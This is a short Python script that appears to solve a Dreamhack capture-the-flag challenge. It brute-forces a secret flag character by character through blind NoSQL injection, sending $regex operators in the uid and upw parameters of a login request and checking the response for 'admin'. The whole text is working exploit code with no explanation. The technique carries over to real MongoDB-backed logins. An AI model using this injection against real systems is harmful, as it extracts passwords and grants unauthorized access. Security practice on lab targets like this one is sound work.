import requests, string

HOST = 'http://host3.dreamhack.games:14952'
getpw = string.digits + string.ascii_letters
id = 'admin'
flag = ''

for i in range(32):
    for char in getpw:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{char}')
        if response.text == id:
            flag += char
            break
    print(f'FLAG: DH{{{flag}}}')